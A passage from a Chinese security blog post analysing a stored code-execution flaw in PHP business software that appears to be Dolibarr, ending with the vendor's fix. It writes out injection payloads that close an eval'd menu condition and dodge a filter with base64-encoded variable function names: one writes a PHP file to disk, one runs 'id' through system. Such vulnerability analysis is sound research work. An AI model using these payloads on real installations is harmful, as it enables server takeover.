<li><code>m.entity IN (0,&quot;.$conf-&gt;entity.&quot;)</code></li>
<li><code>m.menu_handler IN ('&quot;.$this-&gt;db-&gt;escape($menu_handler).&quot;','all')</code></li>
</ul>
<p>所以我们如果能找到一个INSERT进<code>&quot;.MAIN_DB_PREFIX.&quot;menu</code>中、可以控制<code>perms</code>和<code>enable</code>字段并且<code>entity</code>和<code>menu_handler</code>能满足WHERE条件的语句即可，这里注意entity来源于<code>$conf-&gt;entity</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="err">$</span><span class="k">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;SELECT m.rowid, m.type, m.module, m.fk_menu, m.fk_mainmenu, m.fk_leftmenu, m.url, m.titre, m.prefix, m.langs, m.perms, m.enabled, m.target, m.mainmenu, m.leftmenu, m.position&#34;</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="err">$</span><span class="k">sql</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s2">&#34; FROM &#34;</span><span class="p">.</span><span class="n">MAIN_DB_PREFIX</span><span class="p">.</span><span class="s2">&#34;menu as m&#34;</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="err">$</span><span class="k">sql</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s2">&#34; WHERE m.entity IN (0,&#34;</span><span class="p">.</span><span class="err">$</span><span class="n">conf</span><span class="o">-&gt;</span><span class="n">entity</span><span class="p">.</span><span class="s2">&#34;)&#34;</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="err">$</span><span class="k">sql</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s2">&#34; AND m.menu_handler IN (&#39;&#34;</span><span class="p">.</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="k">escape</span><span class="p">(</span><span class="err">$</span><span class="n">menu_handler</span><span class="p">).</span><span class="s2">&#34;&#39;,&#39;all&#39;)&#34;</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">type_user</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
</span><span class="w">    </span><span class="err">$</span><span class="k">sql</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s2">&#34; AND m.usertype IN (0,2)&#34;</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="err">}</span><span class="w">
</span><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">type_user</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
</span><span class="w">    </span><span class="err">$</span><span class="k">sql</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s2">&#34; AND m.usertype IN (1,2)&#34;</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="err">}</span><span class="w">
</span><span class="w"></span><span class="err">$</span><span class="k">sql</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s2">&#34; ORDER BY m.position, m.rowid&#34;</span><span class="p">;</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>这里直接正则搜索一下，的确存在这么个点，在同一个文件的<code>create()</code>函数</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113000249851.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113000249851"
	
	
></p>
<p>接下来得看看参数是否可控，这里的VALUES设定为成员属性，但是entity是<code>$conf-&gt;entity</code>，这里就直接满足了条件，因为上面SQL查询也是这个</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113001946769.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113001946769"
	
	
></p>
<p>接下来发现<code>menu_handler</code>在执行<code>menuLoad</code>函数的时候都会自动填入的</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113002330295.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113002330295"
	
	
></p>
<p>所以这两个WHERE条件都解决了，剩下就是看<code>perms</code>和<code>enable</code>是否可控了，在类内部没看到有对成员变量赋值的地方，所以还得全局搜索一下</p>
<p>发现<code>perms</code>和<code>enable</code>在<code>menus/edit.php</code>中都是可以直接控制的</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113002856865.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113002856865"
	
	
></p>
<p>经过调试发现，这里menuId需要唯一否则会冲突无法写入数据库，这里的type需要设置为1，否则也会报错</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113004046625.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>接下来就可以研究一下，如何去绕过waf执行eval，这里作者的做法是利用php的特性：<font color=red><strong>变量函数</strong></font></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1">// file_put_contents
</span><span class="c1"></span><span class="nv">$a</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;ZmlsZV9wdXRfY29udGVudHM=&#39;</span><span class="p">);</span>
<span class="c1">// shellcode
</span><span class="c1"></span><span class="nv">$a</span><span class="p">(</span><span class="s1">&#39;.1234.php&#39;</span><span class="p">,</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;PD9waHAgcGhwaW5mbygpOz8+Cg==&#39;</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p>再往前看<code>verifCond</code>函数</p>
<p>这里进行了一个字符串的拼接，由于是执行eval的，所以我们可以去闭合他的括号，注释掉后面的代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">verifCond</span><span class="p">(</span><span class="nv">$strToEvaluate</span><span class="p">)</span>
<span class="p">{</span>
   <span class="k">global</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$conf</span><span class="p">,</span> <span class="nv">$langs</span><span class="p">;</span>
   <span class="k">global</span> <span class="nv">$leftmenu</span><span class="p">;</span>
   <span class="k">global</span> <span class="nv">$rights</span><span class="p">;</span> <span class="c1">// To export to dol_eval function
</span><span class="c1"></span>
   <span class="c1">//print $strToEvaluate.&#34;&lt;br&gt;\n&#34;;
</span><span class="c1"></span>   <span class="nv">$rights</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$strToEvaluate</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$strToEvaluate</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;if(!(&#39;</span><span class="o">.</span><span class="nv">$strToEvaluate</span><span class="o">.</span><span class="s1">&#39;)) $rights = false;&#39;</span><span class="p">;</span>
      <span class="nx">dol_eval</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">);</span> 
   <span class="p">}</span>
   <span class="k">return</span> <span class="nv">$rights</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>也就是这样的一个payload（无害化的payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="mi">1</span><span class="o">==</span><span class="mi">1</span><span class="p">));</span><span class="nv">$d</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;ZWNobyAnPCEtLScmJmVjaG8gcHduZWQhISEmJmlkJiZlY2hvJy0tPic=&#39;</span><span class="p">);</span><span class="nv">$a</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;c3lzdGVt&#39;</span><span class="p">);</span><span class="nv">$a</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span><span class="c1">//
</span></code></pre></td></tr></table>
</div>
</div><p>然后放在enable参数存入数据库，最后发包如下</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113004416906.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113004416906"
	
	
></p>
<p>成功存入数据库</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113004508666.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113004508666"
	
	
></p>
<p>debug一下，进入verifCond</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113004645570.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113004645570"
	
	
></p>
<p>跟进verifCond，恶意构造拼接绕过，进入dol_eval</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113004826342.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113004826342"
	
	
></p>
<p>代码执行成功</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113004918701.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113004918701"
	
	
></p>
<p>成功getshell</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113005123697.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113005123697"
	
	
></p>
<p>漏洞调用栈</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113004952924.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113004952924"
	
	
></p>
<h1 id="漏洞总结">漏洞总结</h1>
<p>这里这个RCE漏洞，其实原理类似于二次注入，先把恶意代码存入数据库，再从数据库提取数据时触发恶意代码，这里还绕过了一个waf，利用的是php的特性——变量函数</p>
<h2 id="漏洞修复">漏洞修复</h2>
<p>这里作者对于漏洞的修复一个是verifCond函数的加固</p>
<p>这里取消了字符串的拼接且让dol_eval的第四个参数为&quot;1&quot;</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113010538177.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113010538177"
	
	
></p>
<p>这样就会走入下面的这个判断，看注释这里的正则就是为了防止RCE而设计的</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113011151428.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113011151428"
	
	
></p>
<p>一个是<code>dol_eval</code>函数的加强，这里<code>forbiddenphpfunctions</code>里添加了<code>verifCond</code>函数，直接禁止了<code>verifCond</code>的执行，但是不太懂这有啥意义hhh</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221113010132703.png"
	
	
	
	loading="lazy"
	
		alt="image-20221113010132703"
	
	
></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/post/cve-2022-2633/">
        
        

        <div class="article-details">
            <h2 class="article-title">[CVE-2022-2633] WordPress All-in-One插件SSRF&#43;任意文件下载</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
        
        

        <div class="article-details">
            <h2 class="article-title">[代码审计]信呼OA2.3.1版本代码审计</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/">
        
        

        <div class="article-details">
            <h2 class="article-title">[代码审计]ThinkPHP 5.0.x 变量覆盖导致的RCE分析</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        
        

        <div class="article-details">
            <h2 class="article-title">[代码审计]Yii2反序列化漏洞分析 V2.0.38</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
        
        

        <div class="article-details">
            <h2 class="article-title">[代码审计]ThinkPHP5的文件包含漏洞</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2022 Huamang
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        <span id="busuanzi_container_page_pv"> 阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span>
        <br>
        
        <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
    </body>
</html>
